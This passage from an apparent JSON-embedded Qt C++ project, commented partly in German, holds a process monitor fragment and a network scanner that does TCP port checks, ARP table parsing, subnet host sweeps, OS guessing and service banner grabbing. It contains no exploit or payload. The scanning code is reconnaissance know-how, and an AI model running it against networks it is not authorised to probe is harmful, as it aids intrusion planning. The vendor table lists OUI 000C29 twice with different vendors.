ProcessMonitor::onProcessDoubleClicked()\r\n{\r\n    QListWidgetItem *currentItem = processListWidget->currentItem();\r\n    if (currentItem) {\r\n        QMessageBox::information(this, \"Prozess Details\",\r\n                                 QString(\"Prozess: %1\").arg(currentItem->text()));\r\n    }\r\n}\r\n",
          "relativePath": "processmonitor.cpp"
        },
        {
          "name": "processmonitor.h",
          "type": "file",
          "content": "#ifndef PROCESSMONITOR_H\r\n#define PROCESSMONITOR_H\r\n\r\n#include <QtWidgets/QMainWindow>\r\n#include <QtWidgets/QVBoxLayout>\r\n#include <QtWidgets/QHBoxLayout>\r\n#include <QtWidgets/QListWidget>\r\n#include <QtWidgets/QPushButton>\r\n#include <QtWidgets/QLabel>\r\n#include <QtWidgets/QLineEdit>\r\n#include <QTimer>\r\n#include <QtWidgets/QMessageBox>\r\n#include <QtCore/QProcess>\r\n#include <QtCore/QStringList>\r\n\r\nclass ProcessMonitor : public QMainWindow\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    ProcessMonitor(QWidget *parent = nullptr);\r\n    ~ProcessMonitor();\r\n\r\nprivate slots:\r\n    void refreshProcessList();\r\n    void killSelectedProcess();\r\n    void filterProcesses(const QString &text);\r\n    void onProcessDoubleClicked();\r\n\r\nprivate:\r\n    void setupUI();\r\n    void populateProcessList();\r\n    QStringList getRunningProcesses();\r\n\r\n    // UI Components\r\n    QWidget *centralWidget;\r\n    QVBoxLayout *mainLayout;\r\n    QHBoxLayout *buttonLayout;\r\n    QHBoxLayout *filterLayout;\r\n\r\n    QLabel *titleLabel;\r\n    QLineEdit *filterEdit;\r\n    QListWidget *processListWidget;\r\n    QPushButton *refreshButton;\r\n    QPushButton *killButton;\r\n    QPushButton *exitButton;\r\n\r\n    QTimer *autoRefreshTimer;\r\n\r\n    // Data\r\n    QStringList allProcesses;\r\n};\r\n\r\n#endif // PROCESSMONITOR_H\r\n",
          "relativePath": "processmonitor.h"
        },
        {
          "name": "scanworkers.cpp",
          "type": "file",
          "content": "#include \"ScanWorkers.h\"\r\n#include <QtCore/QMap>\r\n#include <QtCore/QIODevice>\r\n#include <QtCore/QDebug>\r\n#include <QtNetwork/QAbstractSocket>\r\n#include <QtCore/QProcess>\r\n#include <QtCore/QTextStream>\r\n#include <QtCore/QStringList>\r\n#include <QtCore/QRegularExpression>\r\n#include <QtNetwork/QNetworkInterface>\r\n#include <QtNetwork/QNetworkAddressEntry>\r\n\r\nstatic QMutex arpMutex;\r\n\r\n// ============================================================================\r\n// ScanWorker - KORRIGIERTE IMPLEMENTIERUNG\r\n// ============================================================================\r\nScanWorker::ScanWorker(const QString &ip, int timeout, QObject *parent)\r\n    : QObject(parent), targetIp(ip), scanTimeout(timeout), hostIndex(-1)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid ScanWorker::setHostIndex(int index)\r\n{\r\n    hostIndex = index;\r\n}\r\n\r\nvoid ScanWorker::run()\r\n{\r\n    try {\r\n        HostInfo host;\r\n        host.ip = targetIp;\r\n        host.isAlive = false;\r\n        host.responseTime = -1;\r\n        host.lastSeen = QDateTime::currentDateTime();\r\n\r\n        // Enhanced ping test with multiple methods\r\n        QElapsedTimer timer;\r\n        timer.start();\r\n\r\n        // Method 1: Try common web ports first\r\n        QList<int> quickPorts = {80, 443, 22, 23, 25, 53, 135, 139, 445, 993, 995, 3389, 5900};\r\n        bool foundOpenPort = false;\r\n\r\n        for (int port : quickPorts) {\r\n            if (quickPortCheck(targetIp, port, 1000)) {\r\n                host.isAlive = true;\r\n                host.responseTime = timer.elapsed();\r\n                host.openPorts.append(QString::number(port));\r\n                host.services.append(getServiceName(port));\r\n                foundOpenPort = true;\r\n                break; // Found one open port, that's enough for basic scan\r\n            }\r\n        }\r\n\r\n        if (host.isAlive) {\r\n            // Try to resolve hostname\r\n            QHostInfo hostInfo = QHostInfo::fromName(targetIp);\r\n            if (hostInfo.error() == QHostInfo::NoError && !hostInfo.hostName().isEmpty()) {\r\n                QString hostname = hostInfo.hostName();\r\n                if (hostname != targetIp) {\r\n                    host.hostname = hostname;\r\n                }\r\n            }\r\n\r\n            // Basic OS detection\r\n            host.os = detectOperatingSystem(targetIp);\r\n\r\n            // Set device type based on open ports\r\n            if (host.openPorts.contains(\"22\") || host.openPorts.contains(\"3389\")) {\r\n                host.deviceType = \"Server\";\r\n            } else if (host.openPorts.contains(\"80\") || host.openPorts.contains(\"443\")) {\r\n                host.deviceType = \"Web Server\";\r\n            } else {\r\n                host.deviceType = \"Computer\";\r\n            }\r\n\r\n            emit hostFound(host);\r\n        }\r\n\r\n        emit hostCompleted();\r\n\r\n    } catch (const std::exception& e) {\r\n        qDebug() << \"Exception in ScanWorker::run():\" << e.what();\r\n        emit hostCompleted();\r\n    } catch (...) {\r\n        qDebug() << \"Unknown exception in ScanWorker::run()\";\r\n        emit hostCompleted();\r\n    }\r\n}\r\n\r\nbool ScanWorker::quickPortCheck(const QString &ip, int port, int timeout)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadOnly);\r\n    bool connected = socket.waitForConnected(timeout);\r\n\r\n    if (connected) {\r\n        socket.disconnectFromHost();\r\n        socket.waitForDisconnected(1000);\r\n    }\r\n\r\n    return connected;\r\n}\r\n\r\nQString ScanWorker::detectOperatingSystem(const QString &ip)\r\n{\r\n    // Simple OS detection based on common service patterns\r\n    QMap<int, QString> serviceOsMap = {\r\n        {22, \"Linux/Unix\"}, // SSH typically Linux\r\n        {3389, \"Windows\"}, // RDP is Windows\r\n        {445, \"Windows\"}, // SMB typically Windows\r\n        {139, \"Windows\"}, // NetBIOS typically Windows\r\n        {80, \"Web Server\"}, // HTTP could be anything\r\n        {443, \"Web Server\"} // HTTPS could be anything\r\n    };\r\n\r\n    // Check which services are available and make educated guess\r\n    for (auto it = serviceOsMap.begin(); it != serviceOsMap.end(); ++it) {\r\n        if (quickPortCheck(ip, it.key(), 1000)) {\r\n            return it.value();\r\n        }\r\n    }\r\n\r\n    return \"Unknown\";\r\n}\r\n\r\nQString ScanWorker::getServiceName(int port)\r\n{\r\n    static QMap<int, QString> services = {\r\n        {20, \"FTP-Data\"}, {21, \"FTP\"}, {22, \"SSH\"}, {23, \"Telnet\"},\r\n        {25, \"SMTP\"}, {53, \"DNS\"}, {67, \"DHCP\"}, {68, \"DHCP\"},\r\n        {69, \"TFTP\"}, {80, \"HTTP\"}, {110, \"POP3\"}, {123, \"NTP\"},\r\n        {143, \"IMAP\"}, {161, \"SNMP\"}, {162, \"SNMP-Trap\"}, {443, \"HTTPS\"},\r\n        {993, \"IMAPS\"}, {995, \"POP3S\"}, {1433, \"MSSQL\"}, {1521, \"Oracle\"},\r\n        {3306, \"MySQL\"}, {3389, \"RDP\"}, {5432, \"PostgreSQL\"}, {5900, \"VNC\"},\r\n        {6379, \"Redis\"}, {8080, \"HTTP-Proxy\"}, {8443, \"HTTPS-Alt\"},\r\n        {27017, \"MongoDB\"}\r\n    };\r\n\r\n    return services.value(port, \"Unknown\");\r\n}\r\n\r\n// ============================================================================\r\n// EnhancedArpScanWorker - KORRIGIERTE IMPLEMENTIERUNG\r\n// ============================================================================\r\nEnhancedArpScanWorker::EnhancedArpScanWorker(const QString &interface, QObject *parent)\r\n    : QObject(parent), networkInterface(interface)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid EnhancedArpScanWorker::run()\r\n{\r\n    try {\r\n        emit arpScanStarted(networkInterface);\r\n\r\n        QStringList foundIPs;\r\n        int entriesFound = 0;\r\n\r\n        // Method 1: Parse system ARP table\r\n        QProcess *arpProcess = new QProcess();\r\n\r\n#ifdef Q_OS_WIN\r\n        arpProcess->setProgram(\"arp\");\r\n        arpProcess->setArguments(QStringList() << \"-a\");\r\n#else\r\n        arpProcess->setProgram(\"arp\");\r\n        arpProcess->setArguments(QStringList() << \"-a\");\r\n#endif\r\n\r\n        arpProcess->start();\r\n\r\n        if (arpProcess->waitForFinished(10000)) {\r\n            QString output = QString::fromLocal8Bit(arpProcess->readAllStandardOutput());\r\n            QStringList lines = output.split('\\n');\r\n\r\n            for (const QString &line : lines) {\r\n                if (line.trimmed().isEmpty()) continue;\r\n\r\n                QString ip, mac;\r\n\r\n#ifdef Q_OS_WIN \\\r\n    // Windows ARP format: \"  192.168.1.1      00-11-22-33-44-55     dynamic\"\r\n                QRegularExpression winArpRegex(R\"(\\s*(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\\s+([a-fA-F0-9\\-]{17})\\s+)\");\r\n                QRegularExpressionMatch winMatch = winArpRegex.match(line);\r\n                if (winMatch.hasMatch()) {\r\n                    ip = winMatch.captured(1);\r\n                    mac = winMatch.captured(2).replace(\"-\", \":\").toUpper();\r\n                }\r\n#else \\\r\n    // Linux ARP format: \"192.168.1.1 ether 00:11:22:33:44:55 C eth0\"\r\n                QRegularExpression linuxArpRegex(R\"((\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\\s+\\w+\\s+([a-fA-F0-9:]{17}))\");\r\n                QRegularExpressionMatch linuxMatch = linuxArpRegex.match(line);\r\n                if (linuxMatch.hasMatch()) {\r\n                    ip = linuxMatch.captured(1);\r\n                    mac = linuxMatch.captured(2).toUpper();\r\n                }\r\n#endif\r\n\r\n                if (!ip.isEmpty() && !mac.isEmpty() &&\r\n                    !ip.startsWith(\"224.\") && !ip.startsWith(\"239.\") && // Skip multicast\r\n                    mac != \"FF:FF:FF:FF:FF:FF\") { // Skip broadcast\r\n\r\n                    if (!foundIPs.contains(ip)) {\r\n                        QString vendor = getMacVendor(mac);\r\n\r\n                        emit arpEntryFound(ip, mac, vendor);\r\n                        foundIPs.append(ip);\r\n                        entriesFound++;\r\n\r\n                        emit arpScanProgress(entriesFound, entriesFound + 10); // Estimate progress\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        delete arpProcess;\r\n\r\n        // Method 2: Additional ping sweep for discovery\r\n        performAdditionalPingSweep(foundIPs, entriesFound);\r\n\r\n        emit arpScanCompleted(entriesFound);\r\n\r\n    } catch (const std::exception& e) {\r\n        qDebug() << \"Exception in EnhancedArpScanWorker::run():\" << e.what();\r\n        emit arpScanCompleted(0);\r\n    } catch (...) {\r\n        qDebug() << \"Unknown exception in EnhancedArpScanWorker::run()\";\r\n        emit arpScanCompleted(0);\r\n    }\r\n}\r\n\r\nvoid EnhancedArpScanWorker::performAdditionalPingSweep(QStringList &foundIPs, int &entriesFound)\r\n{\r\n    try {\r\n        QStringList localNetworks = getLocalNetworkIPs();\r\n\r\n        for (const QString &baseNetwork : localNetworks) {\r\n            QStringList ipParts = baseNetwork.split('.');\r\n            if (ipParts.size() == 4) {\r\n                QString networkBase = QString(\"%1.%2.%3.\").arg(ipParts[0], ipParts[1], ipParts[2]);\r\n\r\n                // Ping nur häufige Host-IPs\r\n                QList<int> commonHosts = {1, 2, 5, 10, 20, 50, 100, 150, 200, 254};\r\n\r\n                for (int host : commonHosts) {\r\n                    QString targetIP = networkBase + QString::number(host);\r\n\r\n                    if (foundIPs.contains(targetIP)) continue;\r\n\r\n                    // Schneller TCP-Ping statt System-Ping\r\n                    if (quickTcpPing(targetIP)) {\r\n                        // Versuche MAC-Adresse aus ARP-Tabelle zu holen\r\n                        QString mac = getMacFromArpTable(targetIP);\r\n                        if (!mac.isEmpty()) {\r\n                            QString vendor = getMacVendor(mac);\r\n\r\n                            emit arpEntryFound(targetIP, mac, vendor);\r\n                            entriesFound++;\r\n                            foundIPs.append(targetIP);\r\n                        }\r\n                    }\r\n\r\n                    // Rate limiting\r\n                    QThread::msleep(50);\r\n                }\r\n            }\r\n        }\r\n    } catch (...) {\r\n        qDebug() << \"Exception im Additional Ping Sweep\";\r\n    }\r\n}\r\n\r\nbool EnhancedArpScanWorker::quickTcpPing(const QString &ip)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, 80, QIODevice::ReadOnly);\r\n    bool connected = socket.waitForConnected(1000);\r\n\r\n    if (connected) {\r\n        socket.disconnectFromHost();\r\n        socket.waitForDisconnected(1000);\r\n    }\r\n\r\n    return connected;\r\n}\r\n\r\nQString EnhancedArpScanWorker::getMacFromArpTable(const QString &ip)\r\n{\r\n    try {\r\n        QProcess *arpLookup = new QProcess();\r\n\r\n#ifdef Q_OS_WIN\r\n        arpLookup->setProgram(\"arp\");\r\n        arpLookup->setArguments(QStringList() << \"-a\" << ip);\r\n#else\r\n        arpLookup->setProgram(\"arp\");\r\n        arpLookup->setArguments(QStringList() << ip);\r\n#endif\r\n\r\n        arpLookup->start();\r\n\r\n        if (!arpLookup->waitForFinished(3000)) {\r\n            arpLookup->kill();\r\n            delete arpLookup;\r\n            return QString();\r\n        }\r\n\r\n        QString output = QString::fromLocal8Bit(arpLookup->readAllStandardOutput());\r\n        delete arpLookup;\r\n\r\n#ifdef Q_OS_WIN\r\n        QRegularExpression macRegex(R\"(([a-fA-F0-9]{2}[-:]?[a-fA-F0-9]{2}[-:]?[a-fA-F0-9]{2}[-:]?[a-fA-F0-9]{2}[-:]?[a-fA-F0-9]{2}[-:]?[a-fA-F0-9]{2}))\");\r\n#else\r\n        QRegularExpression macRegex(R\"(([a-fA-F0-9:]{17}))\");\r\n#endif\r\n\r\n        QRegularExpressionMatch match = macRegex.match(output);\r\n        if (match.hasMatch()) {\r\n            QString mac = match.captured(1).replace(\"-\", \":\").toUpper();\r\n            return mac;\r\n        }\r\n    } catch (...) {\r\n        qDebug() << \"Exception beim MAC-Lookup für IP:\" << ip;\r\n    }\r\n\r\n    return QString();\r\n}\r\n\r\nQStringList EnhancedArpScanWorker::getLocalNetworkIPs()\r\n{\r\n    QStringList networks;\r\n\r\n    try {\r\n        const auto interfaces = QNetworkInterface::allInterfaces();\r\n        for (const QNetworkInterface &interface : interfaces) {\r\n            if (interface.flags().testFlag(QNetworkInterface::IsUp) &&\r\n                !interface.flags().testFlag(QNetworkInterface::IsLoopBack) &&\r\n                interface.flags().testFlag(QNetworkInterface::IsRunning)) {\r\n\r\n                const auto addressEntries = interface.addressEntries();\r\n                for (const QNetworkAddressEntry &entry : addressEntries) {\r\n                    if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {\r\n                        QString ip = entry.ip().toString();\r\n                        if (!ip.startsWith(\"169.254.\")) { // Skip APIPA addresses\r\n                            networks.append(ip);\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    } catch (...) {\r\n        qDebug() << \"Exception beim Ermitteln lokaler IPs\";\r\n    }\r\n\r\n    return networks;\r\n}\r\n\r\nQString EnhancedArpScanWorker::getMacVendor(const QString &mac)\r\n{\r\n    if (mac.isEmpty() || mac.length() < 8) {\r\n        return \"Unbekannt\";\r\n    }\r\n\r\n    try {\r\n        // Extract first 3 octets (OUI)\r\n        QString oui = mac.left(8).toUpper().replace(\":\", \"\").replace(\"-\", \"\");\r\n        if (oui.length() < 6) return \"Unbekannt\";\r\n\r\n        oui = oui.left(6);\r\n\r\n        // Thread-safe vendor lookup mit static map\r\n        static const QMap<QString, QString> vendorMap = {\r\n                                                         // Apple\r\n                                                         {\"000393\", \"Apple Inc.\"}, {\"001124\", \"Apple Inc.\"}, {\"0016CB\", \"Apple Inc.\"},\r\n                                                         {\"001E52\", \"Apple Inc.\"}, {\"001F5B\", \"Apple Inc.\"}, {\"0021E9\", \"Apple Inc.\"},\r\n                                                         {\"002312\", \"Apple Inc.\"}, {\"002332\", \"Apple Inc.\"}, {\"002436\", \"Apple Inc.\"},\r\n                                                         {\"3C15C2\", \"Apple Inc.\"}, {\"40A6D9\", \"Apple Inc.\"}, {\"44D884\", \"Apple Inc.\"},\r\n\r\n                                                         // Samsung\r\n                                                         {\"000E8F\", \"Samsung Electronics\"}, {\"0012FB\", \"Samsung Electronics\"},\r\n                                                         {\"001377\", \"Samsung Electronics\"}, {\"0015B9\", \"Samsung Electronics\"},\r\n                                                         {\"30F9ED\", \"Samsung Electronics\"}, {\"38AA3C\", \"Samsung Electronics\"},\r\n                                                         {\"74F61C\", \"Samsung Electronics\"}, {\"E8039A\", \"Samsung Electronics\"},\r\n\r\n                                                         // Intel\r\n                                                         {\"000C29\", \"Intel Corporation\"}, {\"001517\", \"Intel Corporation\"},\r\n                                                         {\"001B21\", \"Intel Corporation\"}, {\"001E67\", \"Intel Corporation\"},\r\n                                                         {\"3C970E\", \"Intel Corporation\"}, {\"7C7A91\", \"Intel Corporation\"},\r\n\r\n                                                         // Microsoft\r\n                                                         {\"000D3A\", \"Microsoft Corporation\"}, {\"001DD8\", \"Microsoft Corporation\"},\r\n                                                         {\"40490F\", \"Microsoft Corporation\"}, {\"7C1E52\", \"Microsoft Corporation\"},\r\n\r\n                                                         // Cisco\r\n                                                         {\"000142\", \"Cisco Systems\"}, {\"000163\", \"Cisco Systems\"},\r\n                                                         {\"000D28\", \"Cisco Systems\"}, {\"001364\", \"Cisco Systems\"},\r\n                                                         {\"547FEE\", \"Cisco Systems\"}, {\"C8D119\", \"Cisco Systems\"},\r\n\r\n                                                         // TP-Link\r\n                                                         {\"001A8C\", \"TP-Link Technologies\"}, {\"002268\", \"TP-Link Technologies\"},\r\n                                                         {\"B0487A\", \"TP-Link Technologies\"}, {\"E8DE27\", \"TP-Link Technologies\"},\r\n\r\n                                                         // D-Link\r\n                                                         {\"001195\", \"D-Link Corporation\"}, {\"001346\", \"D-Link Corporation\"},\r\n                                                         {\"1C7EE5\", \"D-Link Corporation\"}, {\"E46F13\", \"D-Link Corporation\"},\r\n\r\n                                                         // Raspberry Pi\r\n                                                         {\"B827EB\", \"Raspberry Pi Foundation\"}, {\"DCA632\", \"Raspberry Pi Foundation\"},\r\n\r\n                                                         // Virtualization\r\n                                                         {\"005056\", \"VMware Inc.\"}, {\"000C29\", \"VMware Inc.\"},\r\n                                                         {\"080027\", \"Oracle VirtualBox\"}, {\"525400\", \"QEMU/KVM\"},\r\n\r\n                                                         // Network equipment\r\n                                                         {\"00904C\", \"Netgear Inc.\"}, {\"CC40D0\", \"Netgear Inc.\"},\r\n                                                         {\"001CDF\", \"Belkin International\"}, {\"944452\", \"Belkin International\"},\r\n                                                         {\"001D7E\", \"Linksys\"}, {\"68CAE4\", \"Linksys\"},\r\n                                                         };\r\n\r\n        return vendorMap.value(oui, \"Unbekannter Hersteller\");\r\n\r\n    } catch (...) {\r\n        return \"Unbekannt\";\r\n    }\r\n}\r\n\r\n// ============================================================================\r\n// Enhanced PortScanWorker implementation\r\n// ============================================================================\r\nPortScanWorker::PortScanWorker(const QString &ip, const QList<int> &ports, QObject *parent)\r\n    : QObject(parent), targetIp(ip), targetPorts(ports), totalPorts(ports.size()), scannedPorts(0)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid PortScanWorker::run()\r\n{\r\n    QElapsedTimer scanTimer;\r\n    scanTimer.start();\r\n\r\n    emit scanStarted(targetIp, totalPorts);\r\n\r\n    for (int port : targetPorts) {\r\n        QElapsedTimer portTimer;\r\n        portTimer.start();\r\n\r\n        bool open = isPortOpen(targetIp, port);\r\n        int responseTime = portTimer.elapsed();\r\n\r\n        QString service = getServiceName(port);\r\n        QString banner = \"\";\r\n        QString version = \"\";\r\n\r\n        if (open) {\r\n            // Try to grab banner for service identification\r\n            QPair<QString, QString> bannerInfo = grabBanner(targetIp, port);\r\n            banner = bannerInfo.first;\r\n            version = bannerInfo.second;\r\n\r\n            if (version.isEmpty() && !banner.isEmpty()) {\r\n                version = extractVersionFromBanner(banner, service);\r\n            }\r\n        }\r\n\r\n        emit portResult(targetIp, port, open, service, version, banner, responseTime);\r\n\r\n        scannedPorts++;\r\n        emit scanProgress(scannedPorts, totalPorts);\r\n\r\n        // Small delay to avoid overwhelming the target\r\n        QThread::msleep(10);\r\n    }\r\n\r\n    qint64 totalTime = scanTimer.elapsed();\r\n    emit scanCompleted(targetIp, scannedPorts, totalTime);\r\n}\r\n\r\nbool PortScanWorker::isPortOpen(const QString &ip, int port)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n    bool connected = socket.waitForConnected(3000);\r\n\r\n    if (connected) {\r\n        socket.disconnectFromHost();\r\n        socket.waitForDisconnected(1000);\r\n    }\r\n\r\n    return connected;\r\n}\r\n\r\nQString PortScanWorker::getServiceName(int port)\r\n{\r\n    static QMap<int, QString> services = {\r\n        {20, \"FTP-Data\"}, {21, \"FTP\"}, {22, \"SSH\"}, {23, \"Telnet\"},\r\n        {25, \"SMTP\"}, {37, \"Time\"}, {42, \"nameserver\"}, {43, \"WHOIS\"},\r\n        {49, \"TACACS\"}, {53, \"DNS\"}, {67, \"DHCP-Server\"}, {68, \"DHCP-Client\"},\r\n        {69, \"TFTP\"}, {70, \"Gopher\"}, {79, \"Finger\"}, {80, \"HTTP\"},\r\n        {88, \"Kerberos\"}, {102, \"MS Exchange\"}, {110, \"POP3\"}, {113, \"Ident\"},\r\n        {119, \"NNTP\"}, {123, \"NTP\"}, {135, \"RPC\"}, {137, \"NetBIOS-ns\"},\r\n        {138, \"NetBIOS-dgm\"}, {139, \"NetBIOS-ssn\"}, {143, \"IMAP\"},\r\n        {161, \"SNMP\"}, {162, \"SNMP-Trap\"}, {179, \"BGP\"}, {194, \"IRC\"},\r\n        {389, \"LDAP\"}, {396, \"Novell\"}, {443, \"HTTPS\"}, {444, \"SNPP\"},\r\n        {445, \"SMB\"}, {458, \"Apple QuickTime\"}, {546, \"DHCPv6-Client\"},\r\n        {547, \"DHCPv6-Server\"}, {563, \"NNTP+SSL\"}, {569, \"MSN\"},\r\n        {636, \"LDAP+SSL\"}, {691, \"MS Exchange\"}, {902, \"VMware\"},\r\n        {993, \"IMAPS\"}, {995, \"POP3S\"}, {1025, \"Microsoft RPC\"},\r\n        {1194, \"OpenVPN\"}, {1337, \"WASTE\"}, {1433, \"MSSQL\"},\r\n        {1434, \"MSSQL-Monitor\"}, {1521, \"Oracle\"}, {1723, \"PPTP\"},\r\n        {1741, \"CiscoWorks\"}, {1755, \"MS-Streaming\"}, {1863, \"MSN\"},\r\n        {2049, \"NFS\"}, {2082, \"cPanel\"}, {2083, \"cPanel-SSL\"},\r\n        {2086, \"WHM\"}, {2087, \"WHM-SSL\"}, {2095, \"Webmail\"},\r\n        {2096, \"Webmail-SSL\"}, {2181, \"Zookeeper\"}, {3128, \"Squid\"},\r\n        {3306, \"MySQL\"}, {3389, \"RDP\"}, {4333, \"mSQL\"}, {4899, \"Radmin\"},\r\n        {5060, \"SIP\"}, {5432, \"PostgreSQL\"}, {5500, \"VNC-HTTP\"},\r\n        {5631, \"pcAnywhere\"}, {5632, \"pcAnywhere\"}, {5800, \"VNC-HTTP\"},\r\n        {5900, \"VNC\"}, {6379, \"Redis\"}, {6667, \"IRC\"}, {7000, \"Cassandra\"},\r\n        {8000, \"HTTP-Alt\"}, {8008, \"HTTP-Alt\"}, {8080, \"HTTP-Proxy\"},\r\n        {8181, \"HTTP-Alt\"}, {8443, \"HTTPS-Alt\"}, {8888, \"HTTP-Alt\"},\r\n        {9000, \"SonarQube\"}, {9042, \"Cassandra\"}, {9200, \"Elasticsearch\"},\r\n        {9300, \"Elasticsearch\"}, {11211, \"Memcached\"}, {27017, \"MongoDB\"},\r\n        {50070, \"Hadoop\"}\r\n    };\r\n\r\n    return services.value(port, \"Unknown\");\r\n}\r\n\r\nQPair<QString, QString> PortScanWorker::grabBanner(const QString &ip, int port)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) {\r\n        return qMakePair(QString(), QString());\r\n    }\r\n\r\n    // Send appropriate probe based on port\r\n    QString probe = getProbeForPort(port);\r\n    if (!probe.isEmpty()) {\r\n        socket.write(probe.toUtf8());\r\n        socket.flush();\r\n    }\r\n\r\n    // Wait for response\r\n    if (socket.waitForReadyRead(2000)) {\r\n        QByteArray data = socket.readAll();\r\n        QString banner = QString::fromUtf8(data).trimmed();\r\n\r\n        // Extract version information\r\n        QString version = extractVersionFromBanner(banner, getServiceName(port));\r\n\r\n        socket.disconnectFromHost();\r\n        return qMakePair(banner, version);\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return qMakePair(QString(), QString());\r\n}\r\n\r\nQString PortScanWorker::getProbeForPort(int port)\r\n{\r\n    static QMap<int, QString> probes = {\r\n        {21, \"\"},  // FTP sends banner automatically\r\n        {22, \"\"},  // SSH sends banner automatically\r\n        {25, \"EHLO test\\r\\n\"},  // SMTP\r\n        {53, \"\"},  // DNS\r\n        {80, \"GET / HTTP/1.0\\r\\n\\r\\n\"},  // HTTP\r\n        {110, \"\"},  // POP3 sends banner automatically\r\n        {143, \"\"},  // IMAP sends banner automatically\r\n        {443, \"\"},  // HTTPS - would need SSL\r\n        {993, \"\"},  // IMAPS - would need SSL\r\n        {995, \"\"}   // POP3S - would need SSL\r\n    };\r\n\r\n    return probes.value(port, \"\");\r\n}\r\n\r\nQString PortScanWorker::extractVersionFromBanner(const QString &banner, const QString &service)\r\n{\r\n    if (banner.isEmpty()) return QString();\r\n\r\n    // Common version extraction patterns\r\n    QRegularExpression versionRegex;\r\n\r\n    if (service == \"SSH\") {\r\n        versionRegex.setPattern(R\"(SSH-[\\d\\.]+-([\\w\\.\\-_]+))\");\r\n    } else if (service == \"HTTP\" || service == \"HTTPS\") {\r\n        versionRegex.setPattern(R\"(Server:\\s*([^\\r\\n]+))\");\r\n    } else if (service == \"FTP\") {\r\n        versionRegex.setPattern(R\"(220[^\\r\\n]*([A-Za-z]+[\\d\\.]+))\");\r\n    } else if (service == \"SMTP\") {\r\n        versionRegex.setPattern(R\"(220[^\\r\\n]*([A-Za-z]+[\\d\\.]+))\");\r\n    } else if (service == \"MySQL\") {\r\n        versionRegex.setPattern(R\"([\\d\\.]+(-[^\\s]+)?)\");\r\n    } else {\r\n        // Generic version pattern\r\n        versionRegex.setPattern(R\"([\\d]+\\.[\\d]+(?:\\.[\\d]+)?)\");\r\n    }\r\n\r\n    QRegularExpressionMatch match = versionRegex.match(banner);\r\n    if (match.hasMatch()) {\r\n        return match.captured(1).isEmpty() ? match.captured(0) : match.captured(1);\r\n    }\r\n\r\n    return QString();\r\n}\r\n\r\n// ============================================================================\r\n// Enhanced PingWorker implementation\r\n// ============================================================================\r\nPingWorker::PingWorker(const QString &ip, QObject *parent)\r\n    : QObject(parent), targetIp(ip)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid PingWorker::run()\r\n{\r\n    QElapsedTimer timer;\r\n    timer.start();\r\n\r\n    // Try multiple ping methods for better reliability\r\n    bool alive = false;\r\n    int responseTime = -1;\r\n    QString method = \"\";\r\n\r\n    // Method 1: TCP ping to port 80\r\n    alive = tcpPing(targetIp, 80, 2000);\r\n    if (alive) {\r\n        responseTime = timer.elapsed();\r\n        method = \"TCP-80\";\r\n    }\r\n\r\n    // Method 2: TCP ping to port 443 if port 80 failed\r\n    if (!alive) {\r\n        timer.restart();\r\n        alive = tcpPing(targetIp, 443, 2000);\r\n        if (alive) {\r\n            responseTime = timer.elapsed();\r\n            method = \"TCP-443\";\r\n        }\r\n    }\r\n\r\n    // Method 3: TCP ping to port 22 if both web ports failed\r\n    if (!alive) {\r\n        timer.restart();\r\n        alive = tcpPing(targetIp, 22, 2000);\r\n        if (alive) {\r\n            responseTime = timer.elapsed();\r\n            method = \"TCP-22\";\r\n        }\r\n    }\r\n\r\n    // Method 4: Try a few more common ports\r\n    if (!alive) {\r\n        QList<int> commonPorts = {21, 23, 25, 53, 110, 143, 993, 995, 3389};\r\n        for (int port : commonPorts) {\r\n            timer.restart();\r\n            if (tcpPing(targetIp, port, 1000)) {\r\n                alive = true;\r\n                responseTime = timer.elapsed();\r\n                method = QString(\"TCP-%1\").arg(port);\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    emit pingResult(targetIp, alive, responseTime);\r\n    emit pingCompleted(targetIp, alive, responseTime, method);\r\n}\r\n\r\nbool PingWorker::tcpPing(const QString &ip, int port, int timeout)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadOnly);\r\n    bool connected = socket.waitForConnected(timeout);\r\n\r\n    if (connected) {\r\n        socket.disconnectFromHost();\r\n        socket.waitForDisconnected(1000);\r\n    }\r\n\r\n    return connected;\r\n}\r\n\r\n// ============================================================================\r\n// Network Discovery Worker\r\n// ============================================================================\r\nNetworkDiscoveryWorker::NetworkDiscoveryWorker(const QString &interface, QObject *parent)\r\n    : QObject(parent), networkInterface(interface)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid NetworkDiscoveryWorker::run()\r\n{\r\n    try {\r\n        emit discoveryStarted(networkInterface);\r\n\r\n        // Sicherheitscheck\r\n        if (networkInterface.isEmpty()) {\r\n            emit discoveryCompleted(networkInterface);\r\n            return;\r\n        }\r\n\r\n        const auto interfaces = QNetworkInterface::allInterfaces();\r\n        bool interfaceFound = false;\r\n\r\n        for (const QNetworkInterface &iface : interfaces) {\r\n            if (networkInterface.isEmpty() || iface.name().contains(networkInterface)) {\r\n                if (iface.flags().testFlag(QNetworkInterface::IsUp) &&\r\n                    !iface.flags().testFlag(QNetworkInterface::IsLoopBack)) {\r\n\r\n                    interfaceFound = true;\r\n                    const auto addressEntries = iface.addressEntries();\r\n\r\n                    for (const QNetworkAddressEntry &entry : addressEntries) {\r\n                        if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {\r\n                            QString network = entry.ip().toString();\r\n                            int prefixLength = entry.prefixLength();\r\n                            QString mac = iface.hardwareAddress();\r\n\r\n                            emit networkFound(network, prefixLength, iface.name(), mac);\r\n\r\n                            // 